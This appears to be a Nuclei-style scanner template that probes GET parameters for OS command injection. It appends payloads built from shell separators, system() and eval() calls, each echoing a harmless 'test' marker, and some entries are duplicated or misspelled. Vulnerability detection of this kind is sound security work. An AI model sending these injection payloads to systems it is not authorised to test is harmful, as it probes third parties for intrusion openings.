id: mr12-osInjectionGet
info:
  author: mr12
  description: Template to check for os command Injection vulnerabilities in GET  Url
    must be https://target.com/site={we will put local host here}
  name: os InjectionGet Detection for GET parameters
  severity: high
  tags:
  - osInjection
requests:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - test
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}{{osPayloads}}'
  payloads:
    osPayloads:
    - ;echo test
    - ';echo test #'
    - ;echo test ;
    - '& echo test #'
    - '& echo test &'
    - '| echo test'
    - '# echo test'
    - '| echo test'
    - $(echo test)
    - '|| echo test'
    - '| echo test |'
    - '|| echo test ||'
    - ;echo test;
    - '` ehoc test `'
    - '%0a echo test %0a '
    - ;echo test|
    - ;|/usr/bin/echo test|
    - "\n/bin/echo test \n"
    - ;system('echo test')
    - ;system('echo test')
    - ;system('echo test')
    - eval('echo test')
    - eval('echo test');
    - response.write test
    - :response.write test
